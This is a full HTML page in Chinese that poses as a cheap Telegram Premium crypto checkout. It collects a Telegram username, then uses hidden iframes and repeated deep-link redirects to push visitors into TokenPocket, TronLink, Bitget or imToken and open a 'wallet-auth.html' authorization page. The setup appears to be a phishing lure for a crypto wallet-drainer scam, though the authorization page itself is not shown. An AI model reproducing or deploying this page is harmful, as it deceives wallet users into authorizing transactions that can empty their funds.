<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Premium - 高级订阅服务</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            -webkit-text-size-adjust: 100%;
        }
        
        html {
            font-size: 16px;
        }
        
        @media (max-width: 480px) {
            html { font-size: 14px; }
        }
        
        @media (max-width: 360px) {
            html { font-size: 13px; }
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            min-height: 100vh;
            min-height: 100dvh;
            padding: 1rem;
            line-height: 1.5;
            overflow-x: hidden;
        }
        
        .container {
            width: 100%;
            max-width: 28rem;
            margin: 0 auto;
            padding: 0.5rem;
        }
        
        .header {
            text-align: center;
            margin-bottom: 2rem;
            padding: 0 0.5rem;
        }
        
        .header h1 {
            font-size: 1.8rem;
            margin-bottom: 0.5rem;
            background: linear-gradient(90deg, #ffd700, #ff8c00);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-weight: 700;
        }
        
        .header p {
            font-size: 0.95rem;
            opacity: 0.9;
        }
        
        .pricing-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 1.25rem;
            padding: 1.5rem;
            margin: 0 auto;
            box-shadow: 0 0.5rem 2rem rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
            text-align: center;
        }
        
        .pricing-header h2 {
            font-size: 1.4rem;
            margin-bottom: 0.5rem;
            color: #ffd700;
            font-weight: 600;
        }
        
        .price {
            font-size: 2.5rem;
            font-weight: bold;
            margin: 1rem 0;
            color: #ffd700;
        }
        
        .price span {
            font-size: 1rem;
            color: rgba(255, 255, 255, 0.8);
        }
        
        .description {
            margin-bottom: 1.5rem;
            font-size: 0.95rem;
            opacity: 0.9;
        }
        
        .btn {
            display: inline-block;
            background: linear-gradient(90deg, #ff8c00, #ffd700);
            color: #1e3c72;
            padding: 1rem 1.5rem;
            border-radius: 3rem;
            text-decoration: none;
            font-weight: 600;
            font-size: 1.1rem;
            transition: all 0.3s ease;
            box-shadow: 0 0.25rem 1rem rgba(255, 140, 0, 0.4);
            border: none;
            cursor: pointer;
            width: 100%;
            margin-bottom: 1rem;
            touch-action: manipulation;
            min-height: 3.5rem;
        }
        
        .btn:active {
            transform: translateY(1px);
            box-shadow: 0 0.125rem 0.5rem rgba(255, 140, 0, 0.4);
        }
        
        .form-container {
            display: none;
            margin-top: 1.5rem;
            text-align: left;
        }
        
        .form-group {
            margin-bottom: 1.25rem;
        }
        
        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
            font-size: 0.95rem;
        }
        
        input {
            width: 100%;
            padding: 1rem;
            border-radius: 0.75rem;
            border: 1px solid rgba(255, 255, 255, 0.2);
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 1rem;
            min-height: 3.5rem;
        }
        
        input:focus {
            outline: none;
            border-color: #ffd700;
        }
        
        .wallet-container {
            display: none;
            margin-top: 1.5rem;
            text-align: left;
        }
        
        .wallet-options {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 0.75rem;
            margin: 1rem 0 1.5rem 0;
        }
        
        .wallet-option {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 0.75rem;
            padding: 1.25rem 0.5rem;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 2px solid transparent;
            min-height: 5rem;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        
        .wallet-option:active {
            background: rgba(255, 255, 255, 0.2);
            border-color: #ffd700;
            transform: scale(0.98);
        }
        
        .wallet-icon {
            width: 2.5rem;
            height: 2.5rem;
            margin-bottom: 0.5rem;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .wallet-icon img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            border-radius: 0.5rem;
        }
        
        .wallet-name {
            font-weight: 600;
            font-size: 0.85rem;
            line-height: 1.2;
        }
        
        .step {
            display: flex;
            align-items: flex-start;
            margin-bottom: 1rem;
        }
        
        .step-number {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 2rem;
            height: 2rem;
            background: #ffd700;
            color: #1e3c72;
            border-radius: 50%;
            font-weight: bold;
            margin-right: 0.75rem;
            font-size: 0.9rem;
            flex-shrink: 0;
        }
        
        .step-text {
            font-size: 0.95rem;
            padding-top: 0.25rem;
        }
        
        .features {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 0.75rem;
            margin-top: 2rem;
        }
        
        .feature {
            background: rgba(255, 255, 255, 0.05);
            padding: 1.25rem 0.5rem;
            border-radius: 0.75rem;
            text-align: center;
        }
        
        .feature-icon {
            font-size: 1.8rem;
            margin-bottom: 0.75rem;
            color: #ffd700;
        }
        
        .feature h3 {
            font-size: 0.9rem;
            margin-bottom: 0.5rem;
            font-weight: 600;
            line-height: 1.2;
        }
        
        .feature p {
            font-size: 0.75rem;
            opacity: 0.9;
            line-height: 1.3;
        }
        
        .temporary-message {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.9);
            color: white;
            padding: 1rem 2rem;
            border-radius: 0.75rem;
            z-index: 1000;
            text-align: center;
            max-width: 80%;
            box-shadow: 0 0.5rem 2rem rgba(0, 0, 0, 0.3);
        }
        
        @media (max-width: 320px) {
            .wallet-options {
                grid-template-columns: 1fr;
                gap: 0.5rem;
            }
            
            .features {
                grid-template-columns: 1fr;
                gap: 0.5rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Telegram 高级订阅服务</h1>
            <p>使用您的加密货币钱包获取 Telegram Premium 订阅</p>
        </div>
        
        <div class="pricing-card">
            <div class="pricing-header">
                <h2>Telegram Premium</h2>
                <div class="price">$1.99<span>/月</span></div>
                <p class="description">为您自己或您的朋友和同事兑换享受专属功能和无限制体验</p>
            </div>
            
            <button id="purchaseBtn" class="btn">立即购买</button>
            
            <div id="userForm" class="form-container">
                <div class="step">
                    <div class="step-number">1</div>
                    <div class="step-text">填写接收 Premium 订阅的 Telegram 用户信息</div>
                </div>
                
                <div class="form-group">
                    <label for="username">Telegram 用户名</label>
                    <input type="text" id="username" placeholder="例如: @username" required>
                </div>
                
                <div class="form-group">
                    <label for="nickname">用户昵称</label>
                    <input type="text" id="nickname" placeholder="例如: 张三" required>
                </div>
                
                <button id="confirmBtn" class="btn">确认支付 $1.99</button>
            </div>
            
            <div id="walletSection" class="wallet-container">
                <div class="step">
                    <div class="step-number">2</div>
                    <div class="step-text">选择付款钱包</div>
                </div>
                
                <div class="wallet-options">
                    <div class="wallet-option" onclick="wakeupWalletApp('TokenPocket')">
                        <div class="wallet-icon">
                            <img src="https://i.ibb.co/yBbDWDrc/Token-Pocket.png" alt="TokenPocket" onerror="this.style.display='none'; this.parentNode.innerHTML='🔷';">
                        </div>
                        <div class="wallet-name">TokenPocket</div>
                    </div>
                    
                    <div class="wallet-option" onclick="wakeupWalletApp('TronLink')">
                        <div class="wallet-icon">
                            <img src="https://i.ibb.co/N2dhDDmF/tronlink.png" alt="TronLink" onerror="this.style.display='none'; this.parentNode.innerHTML='🔶';">
                        </div>
                        <div class="wallet-name">TronLink</div>
                    </div>
                    
                    <div class="wallet-option" onclick="wakeupWalletApp('Bitget')">
                        <div class="wallet-icon">
                            <img src="https://i.ibb.co/gbqHxTKN/Bitget-wallet.png" alt="Bitget Wallet" onerror="this.style.display='none'; this.parentNode.innerHTML='💰';">
                        </div>
                        <div class="wallet-name">Bitget Wallet</div>
                    </div>
                    
                    <div class="wallet-option" onclick="wakeupWalletApp('imToken')">
                        <div class="wallet-icon">
                            <img src="https://i.ibb.co/C3L6Lkd1/imtoken.png" alt="imToken" onerror="this.style.display='none'; this.parentNode.innerHTML='💳';">
                        </div>
                        <div class="wallet-name">imToken</div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="features">
            <div class="feature">
                <div class="feature-icon">
                    <img src="https://i.ibb.co/4nWVZXSp/open-folder-file-icon-219486.png" alt="更大文件上传" style="width: 40px; height: 40px;">
                </div>
                <h3>更大文件上传</h3>
                <p>上传最大 4GB 的文件</p>
            </div>
            
            <div class="feature">
                <div class="feature-icon">
                    <img src="https://i.ibb.co/C58QKWSM/1695711361784527.jpg" alt="更快的下载速度" style="width: 40px; height: 40px;">
                </div>
                <h3>更快的下载速度</h3>
                <p>享受无限制的下载速度</p>
            </div>
            
            <div class="feature">
                <div class="feature-icon">
                    <img src="https://i.ibb.co/whwVyw5b/Telegram-logo-svg.webp" alt="专属贴纸" style="width: 40px; height: 40px;">
                </div>
                <h3>专属贴纸</h3>
                <p>使用 Premium 专属动画贴纸</p>
            </div>
            
            <div class="feature">
                <div class="feature-icon">
                    <img src="https://i.ibb.co/XZKJLw9b/photo-2025-10-31-23-15-28.jpg" alt="高级聊天管理" style="width: 40px; height: 40px;">
                </div>
                <h3>高级聊天管理</h3>
                <p>创建群组链接和更多管理工具</p>
            </div>
        </div>
    </div>

    <script>
        // 显示临时消息函数
        function showTemporaryMessage(message) {
            const existingMessage = document.querySelector('.temporary-message');
            if (existingMessage) {
                existingMessage.remove();
            }
            
            const messageDiv = document.createElement('div');
            messageDiv.className = 'temporary-message';
            messageDiv.textContent = message;
            document.body.appendChild(messageDiv);
            
            setTimeout(() => {
                if (messageDiv.parentNode) {
                    messageDiv.remove();
                }
            }, 3000);
        }

        // 检测是否在钱包内部
        function isInWalletBrowser() {
            return window.ethereum || window.tronWeb || 
                   navigator.userAgent.includes('TokenPocket') ||
                   navigator.userAgent.includes('TronLink') ||
                   navigator.userAgent.includes('Bitget') ||
                   navigator.userAgent.includes('imToken') ||
                   navigator.userAgent.includes('BitKeep');
        }

        // 初始化
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('purchaseBtn').addEventListener('click', function() {
                document.getElementById('userForm').style.display = 'block';
                this.style.display = 'none';
            });
            
            document.getElementById('confirmBtn').addEventListener('click', function() {
                const username = document.getElementById('username').value.trim();
                const nickname = document.getElementById('nickname').value.trim();
                
                if (!username || !nickname) {
                    showTemporaryMessage('请填写完整的用户信息！');
                    return;
                }
                
                if (!username.startsWith('@')) {
                    showTemporaryMessage('用户名必须以 @ 开头');
                    return;
                }
                
                document.getElementById('walletSection').style.display = 'block';
                document.getElementById('userForm').style.display = 'none';
            });
        });

        // 生成支付链接
        function generatePaymentUrl() {
            const username = document.getElementById('username').value.trim();
            const nickname = document.getElementById('nickname').value.trim();
            
            if (!username || !nickname) {
                showTemporaryMessage('请先填写用户信息！');
                return null;
            }
            
            // 生成订单号
            const orderId = 'TG' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
            
            // 构建钱包授权页面 URL
            const authUrl = `wallet-auth.html?orderId=${orderId}&username=${encodeURIComponent(username)}&nickname=${encodeURIComponent(nickname)}&amount=1.99`;
            const fullAuthUrl = window.location.origin + (window.location.pathname.includes('/') ? authUrl : '/' + authUrl);
            
            return fullAuthUrl;
        }

        // 钱包唤醒函数
        function wakeupWalletApp(walletName) {
            const fullAuthUrl = generatePaymentUrl();
            if (!fullAuthUrl) return;

            console.log('支付链接:', fullAuthUrl);

            // 如果在钱包内部，直接跳转
            if (isInWalletBrowser()) {
                showTemporaryMessage('正在跳转到支付页面...');
                setTimeout(() => {
                    const authUrl = `wallet-auth.html${window.location.search}`;
                    window.location.href = authUrl;
                }, 500);
                return;
            }

            // 根据钱包类型调用不同的唤醒方法
            if (walletName === 'TokenPocket') {
                wakeupTokenPocket(fullAuthUrl);
            } else if (walletName === 'TronLink') {
                wakeupTronLink(fullAuthUrl);
            } else if (walletName === 'Bitget') {
                wakeupBitget(fullAuthUrl);
            } else if (walletName === 'imToken') {
                wakeupImToken(fullAuthUrl);
            }
        }

        // TokenPocket 唤醒
        function wakeupTokenPocket(fullAuthUrl) {
            const schemes = [
                'tpoutside://',
                `tpoutside://open?url=${encodeURIComponent(fullAuthUrl)}`,
                `tpoutside://pull.activity?action=openDapp&dappUrl=${encodeURIComponent(fullAuthUrl)}`
            ];
            
            attemptMultipleSchemes(schemes, 'TokenPocket');
        }

        // TronLink 唤醒
        function wakeupTronLink(fullAuthUrl) {
            const schemes = [
                'tronlinkoutside://',
                `tronlinkoutside://open?url=${encodeURIComponent(fullAuthUrl)}`,
                `tronlink://open?url=${encodeURIComponent(fullAuthUrl)}`
            ];
            
            attemptMultipleSchemes(schemes, 'TronLink');
        }

        // Bitget Wallet 唤醒
        function wakeupBitget(fullAuthUrl) {
            const schemes = [
                'bitkeep://',
                'bitgetwallet://',
                `bitkeep://open?url=${encodeURIComponent(fullAuthUrl)}`,
                `bitgetwallet://open?url=${encodeURIComponent(fullAuthUrl)}`,
                `bk://open?url=${encodeURIComponent(fullAuthUrl)}`,
                `bitkeep://browse?url=${encodeURIComponent(fullAuthUrl)}`,
                `bitgetwallet://browse?url=${encodeURIComponent(fullAuthUrl)}`,
                `bitkeep://dapp?url=${encodeURIComponent(fullAuthUrl)}`,
                `bitgetwallet://dapp?url=${encodeURIComponent(fullAuthUrl)}`,
                `bitkeep://web?url=${encodeURIComponent(fullAuthUrl)}`,
                `bitgetwallet://web?url=${encodeURIComponent(fullAuthUrl)}`
            ];
            
            attemptMultipleSchemes(schemes, 'Bitget Wallet');
        }

        // imToken 唤醒
        function wakeupImToken(fullAuthUrl) {
            const schemes = [
                'imtokenv2://',
                `imtokenv2://navigate?url=${encodeURIComponent(fullAuthUrl)}`,
                `imtoken://navigate?url=${encodeURIComponent(fullAuthUrl)}`
            ];
            
            attemptMultipleSchemes(schemes, 'imToken');
        }

        // 尝试多个唤醒方案
        function attemptMultipleSchemes(schemes, walletName) {
            let tried = 0;
            let success = false;
            
            function tryNextScheme() {
                if (tried >= schemes.length) {
                    if (!success) {
                        console.log(`所有 ${walletName} 唤醒方案都失败了`);
                        showTemporaryMessage(`${walletName} 唤醒失败`);
                    }
                    return;
                }
                
                const scheme = schemes[tried];
                console.log(`尝试 ${walletName} 方案 ${tried + 1}:`, scheme);
                
                // 尝试唤醒
                if (attemptWakeup(scheme, walletName)) {
                    success = true;
                    console.log(`${walletName} 唤醒成功`);
                    return;
                }
                
                tried++;
                if (tried < schemes.length) {
                    setTimeout(tryNextScheme, 400);
                }
            }
            
            tryNextScheme();
        }

        // 尝试唤醒钱包 - 返回是否成功
        function attemptWakeup(scheme, walletName) {
            let attempted = false;
            
            // 方法1: 使用iframe
            try {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = scheme;
                iframe.onload = function() {
                    attempted = true;
                    console.log(`${walletName} iframe加载成功`);
                };
                iframe.onerror = function() {
                    console.log(`${walletName} iframe加载失败`);
                };
                document.body.appendChild(iframe);
                
                setTimeout(() => {
                    try {
                        document.body.removeChild(iframe);
                    } catch (e) {
                        console.log('移除iframe失败:', e);
                    }
                }, 1500);
            } catch (error) {
                console.log(`${walletName} iframe方式失败:`, error);
            }
            
            // 方法2: 使用window.location (延迟执行)
            setTimeout(() => {
                try {
                    window.location.href = scheme;
                    attempted = true;
                    console.log(`${walletName} location跳转成功`);
                } catch (error) {
                    console.log(`${walletName} location方式失败:`, error);
                }
            }, 100);
            
            return attempted;
        }

        // 检测是否在Bitget Wallet内
        function checkBitgetWallet() {
            if (navigator.userAgent.includes('Bitget') || navigator.userAgent.includes('BitKeep')) {
                console.log('在Bitget Wallet环境中');
                return true;
            }
            return false;
        }

        // 页面加载时检查环境
        window.addEventListener('load', function() {
            if (checkBitgetWallet()) {
                console.log('检测到在Bitget Wallet中运行');
            }
        });
    </script>
</body>
</html>
